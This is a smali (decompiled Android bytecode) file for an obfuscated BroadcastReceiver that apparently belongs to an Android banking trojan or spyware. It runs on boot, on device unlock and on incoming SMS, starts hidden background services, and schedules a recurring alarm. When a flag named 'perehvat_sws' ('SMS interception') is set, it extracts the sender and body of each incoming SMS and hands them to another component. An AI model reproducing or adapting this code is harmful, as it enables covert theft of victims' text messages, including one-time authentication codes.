.class public Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;
.super Landroid/content/BroadcastReceiver;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method public fddo(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 9

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p2

    if-eqz p2, :cond_40

    :try_start_6
    const-string v0, "pdus"

    invoke-virtual {p2, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, [Ljava/lang/Object;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_e} :catch_40

    const-string v0, ""

    if-eqz p2, :cond_3a

    :try_start_12
    array-length v1, p2

    const/4 v2, 0x0

    move-object v3, v0

    :goto_15
    if-ge v2, v1, :cond_3b

    aget-object v0, p2, v2

    check-cast v0, [B

    invoke-static {v0}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v0

    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    add-int/lit8 v2, v2, 0x1

    move-object v0, v4

    goto :goto_15

    :cond_3a
    move-object v3, v0

    :cond_3b
    iget-object p2, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1, v0, v3}, Lnaqsl/ebxcb/exu/int;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_40
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_40} :catch_40

    :catch_40
    :cond_40
    return-void
.end method

.method ifdf(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 7

    const-string v0, "startAlarm"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    :try_start_6
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_10} :catch_10

    :catch_10
    :try_start_10
    iget-object v2, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v3, "Interval"

    invoke-virtual {v2, p1, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    int-to-long v2, v2

    invoke-static {p1, v0, v2, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_20} :catch_21

    goto :goto_26

    :catch_21
    const-wide/16 v2, 0x3a98

    invoke-static {p1, v0, v2, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V

    :goto_26
    const-string v0, "android.intent.action.USER_PRESENT"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_38

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lnaqsl/ebxcb/exu/ServiceCommands;

    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_38
    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_53

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v1, "perehvat_sws"

    invoke-virtual {v0, p1, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "true"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_53

    invoke-virtual {p0, p1, p2}, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo(Landroid/content/Context;Landroid/content/Intent;)V

    :cond_53
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v0}, Lnaqsl/ebxcb/exu/int;->fddo()Z

    move-result v0

    if-eqz v0, :cond_9

    return-void

    :cond_9
    invoke-virtual {p0, p1, p2}, Lnaqsl/ebxcb/exu/Receiver/ReceiverBoot;->ifdf(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
